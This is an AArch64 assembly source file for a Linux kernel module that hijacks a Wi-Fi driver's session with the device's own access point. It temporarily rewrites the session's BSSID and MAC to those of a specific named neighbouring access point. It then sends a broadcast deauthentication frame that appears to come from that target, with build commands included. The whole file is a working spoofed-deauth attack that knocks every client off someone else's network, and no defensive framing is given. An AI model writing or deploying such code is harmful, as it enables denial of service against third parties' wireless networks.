/*
 * petx9.S - Cross-BSS spoofed deauth via PE session on HOME AP
 *
 * Finds PE session by HOME AP's BSSID (we're connected to it),
 * temporarily overwrites bssId+selfMacAddr with TARGET BSSID,
 * sends broadcast deauth that appears to come from the target AP,
 * then restores the original values.
 *
 * This works because:
 * 1. The PE session exists (connected to home AP)
 * 2. The LIM TX path works for connected BSS (proven)
 * 3. The deauth frame's SA/BSSID will be the TARGET AP's MAC
 * 4. Adjacent channel (ch8→ch9, 5 MHz apart) allows reception
 *
 * Build on Mac:
 *   clang -target aarch64-linux-gnu -c -o petx9.o petx9.S
 *   /opt/homebrew/Cellar/llvm@16/16.0.6_1/bin/ld.lld -r -o petx9.ko petx9.o
 */

.section .gnu.linkonce.this_module, "aw"
.balign 256
__this_module:
    .fill 24, 1, 0
    .asciz "kfind"
    .fill 50, 1, 0
    .fill 256, 1, 0
    .quad init_module
    .fill 440, 1, 0
    .quad cleanup_module
    .fill 40, 1, 0

.section .modinfo, "a"
    .asciz "vermagic=4.19.81-perf+ SMP preempt mod_unload modversions aarch64"
    .asciz "name=kfind"
    .asciz "license=GPL"

.section __versions, "a"
    .quad 0
    .asciz "module_layout"
    .balign 64, 0
    .quad 0
    .asciz "printk"
    .balign 64, 0
    .quad 0
    .asciz "kallsyms_lookup_name"
    .balign 64, 0

.section .rodata, "a"
str_cds:          .asciz "cds_get_context"
str_pe_find_bss:  .asciz "pe_find_session_by_bssid"
str_lim_deauth:   .asciz "lim_send_deauth_mgmt_frame"

fmt_init:     .asciz "petx9: cross-BSS deauth (home PE→target spoof)\n"
fmt_lookup:   .asciz "petx9: home bssid %02x:%02x:%02x:%02x:%02x:%02x\n"
fmt_sess:     .asciz "petx9: session=%px bssid=%02x:%02x:%02x:%02x:%02x:%02x\n"
fmt_nosess:   .asciz "petx9: NO session for home BSSID\n"
fmt_selfmac:  .asciz "petx9: selfMac=%02x:%02x:%02x:%02x:%02x:%02x\n"
fmt_spoof:    .asciz "petx9: spoofed bss+self to %02x:%02x:%02x:%02x:%02x:%02x\n"
fmt_call:     .asciz "petx9: calling lim_send_deauth_mgmt_frame\n"
fmt_restored: .asciz "petx9: bssId+selfMac restored\n"
fmt_err:      .asciz "petx9: ERROR - symbol not found\n"
fmt_done:     .asciz "petx9: done\n"

/* HOME AP's 2.4GHz BSSID - used to FIND the PE session */
.balign 8
home_bssid:
    .byte 0x8c,0xde,0xf9,0xb3,0x9e,0x1f
    .byte 0,0

/* TARGET AP BSSID - Flymodem2631 - used to SPOOF the deauth */
.balign 8
target_bssid:
    .byte 0x8c,0xf0,0xdf,0x1f,0x4f,0xc7
    .byte 0,0

/* Broadcast destination */
.balign 8
bcast_mac:
    .byte 0xff,0xff,0xff,0xff,0xff,0xff
    .byte 0,0

.equ SELFMAC_OFF, 0xC6
.equ BSSID_OFF, 0xC0

.section .init.text, "ax"
.globl init_module
.type init_module, %function
init_module:
    stp x29, x30, [sp, #-112]!
    mov x29, sp
    stp x19, x20, [sp, #16]
    stp x21, x22, [sp, #32]
    stp x23, x24, [sp, #48]
    stp x25, x26, [sp, #64]
    stp x27, x28, [sp, #80]
    /* sp+96..111: saved bssId(6) + selfMacAddr(6) = 12 bytes */

    adrp x0, fmt_init
    add x0, x0, :lo12:fmt_init
    bl printk

    /* Resolve symbols */
    adrp x0, str_cds
    add x0, x0, :lo12:str_cds
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x19, x0                /* x19 = cds_get_context */

    adrp x0, str_pe_find_bss
    add x0, x0, :lo12:str_pe_find_bss
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x20, x0                /* x20 = pe_find_session_by_bssid */

    adrp x0, str_lim_deauth
    add x0, x0, :lo12:str_lim_deauth
    bl kallsyms_lookup_name
    cbz x0, .Lerr
    mov x21, x0                /* x21 = lim_send_deauth_mgmt_frame */

    /* Get mac_ctx: cds_get_context(0x35) for PE */
    mov w0, #0x35
    blr x19
    cbz x0, .Lerr
    mov x22, x0                /* x22 = mac_ctx */

    /* Print home BSSID we're looking for */
    adrp x8, home_bssid
    add x8, x8, :lo12:home_bssid
    adrp x0, fmt_lookup
    add x0, x0, :lo12:fmt_lookup
    ldrb w1, [x8, #0]
    ldrb w2, [x8, #1]
    ldrb w3, [x8, #2]
    ldrb w4, [x8, #3]
    ldrb w5, [x8, #4]
    ldrb w6, [x8, #5]
    bl printk

    /* pe_find_session_by_bssid(mac_ctx, home_bssid, &session_id) */
    sub sp, sp, #16            /* allocate stack for session_id output */
    mov x0, x22                /* mac_ctx */
    adrp x1, home_bssid
    add x1, x1, :lo12:home_bssid
    mov x2, sp                 /* &session_id on stack */
    blr x20                    /* pe_find_session_by_bssid */
    add sp, sp, #16

    cbz x0, .Lnosess
    mov x23, x0                /* x23 = session */

    /* Print session info */
    add x8, x23, #BSSID_OFF
    adrp x0, fmt_sess
    add x0, x0, :lo12:fmt_sess
    mov x1, x23
    ldrb w2, [x8, #0]
    ldrb w3, [x8, #1]
    ldrb w4, [x8, #2]
    ldrb w5, [x8, #3]
    ldrb w6, [x8, #4]
    ldrb w7, [x8, #5]
    bl printk

    /* ===== Save original bssId (6 bytes at +0xC0) ===== */
    add x8, x23, #BSSID_OFF
    ldr w24, [x8]              /* x24 = first 4 bytes of bssId */
    ldrh w25, [x8, #4]        /* x25 = last 2 bytes of bssId */

    /* ===== Save original selfMacAddr (6 bytes at +0xC6) ===== */
    add x8, x23, #SELFMAC_OFF
    ldr w26, [x8]              /* x26 = first 4 bytes of selfMac */
    ldrh w27, [x8, #4]        /* x27 = last 2 bytes of selfMac */

    /* Print original selfMac */
    adrp x0, fmt_selfmac
    add x0, x0, :lo12:fmt_selfmac
    add x8, x23, #SELFMAC_OFF
    ldrb w1, [x8, #0]
    ldrb w2, [x8, #1]
    ldrb w3, [x8, #2]
    ldrb w4, [x8, #3]
    ldrb w5, [x8, #4]
    ldrb w6, [x8, #5]
    bl printk

    /* ===== Overwrite bssId with TARGET BSSID ===== */
    adrp x10, target_bssid
    add x10, x10, :lo12:target_bssid
    add x8, x23, #BSSID_OFF
    ldr w9, [x10]
    str w9, [x8]
    ldrh w9, [x10, #4]
    strh w9, [x8, #4]

    /* ===== Overwrite selfMacAddr with TARGET BSSID ===== */
    add x8, x23, #SELFMAC_OFF
    ldr w9, [x10]
    str w9, [x8]
    ldrh w9, [x10, #4]
    strh w9, [x8, #4]

    /* Print spoofed MAC */
    adrp x0, fmt_spoof
    add x0, x0, :lo12:fmt_spoof
    ldrb w1, [x10, #0]
    ldrb w2, [x10, #1]
    ldrb w3, [x10, #2]
    ldrb w4, [x10, #3]
    ldrb w5, [x10, #4]
    ldrb w6, [x10, #5]
    bl printk

    /* ===== Send deauth ===== */
    adrp x0, fmt_call
    add x0, x0, :lo12:fmt_call
    bl printk

    /* lim_send_deauth_mgmt_frame(mac_ctx, reason, DA, session, waitForAck) */
    mov x0, x22                /* mac_ctx */
    mov w1, #7                 /* reason: Class 3 frame */
    adrp x2, bcast_mac
    add x2, x2, :lo12:bcast_mac
    mov x3, x23                /* session */
    mov w4, #0                 /* waitForAck = false */
    blr x21                    /* lim_send_deauth_mgmt_frame */

    /* ===== Restore bssId ===== */
    add x8, x23, #BSSID_OFF
    str w24, [x8]
    strh w25, [x8, #4]

    /* ===== Restore selfMacAddr ===== */
    add x8, x23, #SELFMAC_OFF
    str w26, [x8]
    strh w27, [x8, #4]

    adrp x0, fmt_restored
    add x0, x0, :lo12:fmt_restored
    bl printk
    b .Ldone

.Lnosess:
    adrp x0, fmt_nosess
    add x0, x0, :lo12:fmt_nosess
    bl printk
    b .Ldone

.Lerr:
    adrp x0, fmt_err
    add x0, x0, :lo12:fmt_err
    bl printk

.Ldone:
    adrp x0, fmt_done
    add x0, x0, :lo12:fmt_done
    bl printk

    mov w0, #-1                /* return -EPERM (don't stay loaded) */
    ldp x27, x28, [sp, #80]
    ldp x25, x26, [sp, #64]
    ldp x23, x24, [sp, #48]
    ldp x21, x22, [sp, #32]
    ldp x19, x20, [sp, #16]
    ldp x29, x30, [sp], #112
    ret

.section .exit.text, "ax"
.globl cleanup_module
.type cleanup_module, %function
cleanup_module:
    ret

/* Required sections */
.section .plt, "ax"
    nop; nop
.section .init.plt, "ax"
    nop; nop
.section .text.ftrace_trampoline, "ax"
    nop; nop
